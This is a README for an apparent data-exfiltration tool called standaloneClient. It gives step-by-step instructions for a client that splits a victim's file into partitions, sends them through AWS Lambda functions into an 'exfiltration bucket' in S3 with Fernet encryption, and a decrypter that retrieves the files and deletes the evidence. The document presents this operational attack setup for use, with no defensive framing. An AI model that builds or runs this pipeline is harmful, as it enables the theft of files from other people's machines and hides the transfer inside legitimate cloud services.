# standaloneClient
## Usage
#### Client
`py clientName.py "Path_to_file"`  
Example:  
`py clientName.py "C:\Users\SomeUser\Desktop\test.txt"`
#### Decrypter
###### Note: If not sure about hostname and filename, check S3 Bucket after exfiltration
`py decrypter.py "Hostname" "Filename"`  
Example after exfiltrating test.txt:  
`py decrypter.py "ID4A0E" "test"`
## Setup

Here we will discuss how to set up a working client for data exfiltration.

###### Note 1: Use python 3.x
###### Note 2: Be careful when using AWS Regions, specially when creating lambda functions and S3 buckets.
###### Note 3: Try to follow the steps in order

#### Client Setup
Open `standaloneClient_template.py` and modify the following lines with desired values.  

*Line 11*  Modify partition size  
`partitionSize = 100 #Change for desired partition size`  
*Line 42*  Modify Orchestrator function name (Remember it)  
`orq_response = self.aws_lambda.invoke(FunctionName = '<ORCHESTRATOR_FUNCTION_NAME>', 
                                       Payload = orqPayload_json)`  
*Line 85* Modify with AWS Keys  
`client.awsConnect('<ACCESS_KEY_ID>','<SECRET_ACCESS_KEY_ID>','<REGION>')`  

#### IAM Console
Go to AWS IAM console and create a role (Remember the ARN name) with the following permissions:  

- AWSLambdaFullAccess
- AmazonS3FullAccess
- CloudWatchFullAccess

#### S3 Console
We will now create 2 buckets.  
The **exfiltration bucket** in which we will save out exfiltrated files (their partitions).  
The **template bucket** in which we will save the template used for creating the lambda functions required.  
(If the above sounds like gibberish, refer to the explanation on how the exfiltration works)  

Create 2 buckets with default config and remember their names. One will be used for exfiltration and the other one for our templates.  

#### Sample Function Setup
Open `sampleFunction_template.py`.  
*Line 6*  Modify with the exfiltration bucket name  
`bucket_name = "<EXFILTRATION_BUCKET_NAME>"`  

Compress the function and upload it to the template bucket created before. Remember the compressed function name. We should now have a sampleFunction_template.zip inside our template bucket.  

#### Lambda console setup
Create a lambda function called `<Insert orchestrator name>`.  
Give the function the role previously created. This can be done by scrolling down a bit one the function is created.  

Copy and paste the contents of `orchestrator_template.py` into the newly created lambda function.  

*Line 26*  Modify IAM Role ARN  
`Role = '<LAMBDA_S3_IAM_ROLE>'`  
*Line 29*  Modify Template Bucket Name  
`'S3Bucket': '<TEMPLATES_BUCKET>'`  
*Line 30* Modify Compressed function name  
`'S3Key': '<COMPRESSED_FUNCTION_NAME>'`  

Increase the timeout of this function to 1 minute and memory to 512MB  

#### Decrypter Setup
Files saved inside our exfiltration bucket are encrypted so... we ned a way to decrypt them. Lets se how to do this.  

Open `sampledecrypter_template.py`  

*Line 7*  Modify fernet key. The key can be generated in a separate script with `Fernet.generate_key()`  
`key = b'<FERNET_KEY>'`  
*Line 23-25*  Modify AWS Tokens and region  
`session = boto3.session.Session(aws_access_key_id = '<AWS_ACCESS_KEY_ID>',
 								aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>',
 								region_name = 'us-east-2')`  
*Line 31,58,80,82* Modify Exfiltration bucket name  
`31- Bucket = '<EXFILTRATION_BUCKET_NAME>'`  
`58- aws_s3_resource.meta.client.download_file('<EXFILTRATION_BUCKET_NAME>', file, 'downloadedFiles/'+name)'`  
`80- bucket = aws_s3_resource.Bucket('<EXFILTRATION_BUCKET_NAME>')`  
`82- aws_s3_resource.Object('<EXFILTRATION_BUCKET_NAME>', file).delete()`  
